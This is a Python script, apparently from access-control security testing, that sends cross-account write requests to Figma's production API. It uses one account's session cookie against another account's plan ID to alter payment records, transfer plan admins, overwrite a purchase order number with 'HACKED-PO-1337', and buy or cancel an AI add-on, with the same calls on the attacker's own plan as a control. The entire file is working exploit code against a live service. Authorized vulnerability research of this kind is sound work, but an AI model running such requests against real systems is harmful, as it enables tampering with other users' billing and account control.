"""plan 写操作越权矩阵:B 用 A 的 planRecordId 执行 save_payment/transfer_plan_admins/purchase_order_number/ai_add_on_purchase
对照:B 用自己 planRecordId 同操作
"""
import sys, io, json, urllib.request
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
B_UID = "1667396392129259941"
A_PLAN = "cc6b6125-a07f-4d39-a54c-50ef65f33919"
B_PLAN = "46b1d26c-c802-4ef1-a83c-d96cfe7295f4"
A_F2 = "qzDqStIDJyGbthpKiuvfwg"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def call(label, path, body, method="PUT"):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Cookie": CK_B, "X-Figma-User-ID": B_UID, "Content-Type": "application/json"}
    req = urllib.request.Request("https://www.figma.com" + path, headers=hdrs,
                                 data=json.dumps(body).encode(), method=method)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        raw = r.read().decode(errors='replace')
        print(f"[{label}] {r.status} {raw[:400]}")
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] {e.code} {raw[:400]}")
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:70]}")

print("===== B→A(越权面) =====")
# 1. save_payment:用 A 的 planRecordId + 空/占位 stripe(测 ACL 先于参数校验还是后)
call("A save_payment(无stripe凭据)", "/api/plans/save_payment",
     {"plan_record_id": A_PLAN, "team_id": "1666382706663462213",
      "stripe_customer_id": "cus_TESTBOGUS", "payment_method_id": "pm_TESTBOGUS",
      "currency": "usd"}, "POST")
# 2. transfer_plan_admins
call("A transfer_plan_admins", f"/api/plans/team/{A_PLAN}/transfer_plan_admins",
     {"resource_type": "file", "resource_id_or_key": A_F2}, "PUT")
# 3. purchase_order_number 篡改
call("A purchase_order_number", f"/api/plans/{A_PLAN}/purchase_order_number",
     {"purchase_order_number": "HACKED-PO-1337"}, "PUT")
# 4. ai_add_on_purchase(带假订单摘要)
call("A ai_add_on_purchase", f"/api/plans/{A_PLAN}/ai_add_on_purchase",
     {"order_summary_ts": 1, "current_variant_id": 1}, "POST")
# 5. ai_add_on_cancel
call("A ai_add_on_cancel", f"/api/plans/{A_PLAN}/ai_add_on_cancel", {}, "POST")
# 6. default_plan_credits_access
call("A default_plan_credits_access", f"/api/plans/{A_PLAN}/default_plan_credits_access",
     {"default_plan_credits_access": True}, "PUT")

print("\n===== B→自己(对照) =====")
call("B save_payment(无stripe凭据)", "/api/plans/save_payment",
     {"plan_record_id": B_PLAN, "team_id": "1667396394890946753",
      "stripe_customer_id": "cus_TESTBOGUS", "payment_method_id": "pm_TESTBOGUS",
      "currency": "usd"}, "POST")
call("B transfer_plan_admins", f"/api/plans/team/{B_PLAN}/transfer_plan_admins",
     {"resource_type": "file", "resource_id_or_key": "xFETb3KJ8wh2U8wjD9jJeY"}, "PUT")
call("B purchase_order_number", f"/api/plans/{B_PLAN}/purchase_order_number",
     {"purchase_order_number": "HACKED-PO-1337"}, "PUT")
call("B default_plan_credits_access", f"/api/plans/{B_PLAN}/default_plan_credits_access",
     {"default_plan_credits_access": True}, "PUT")
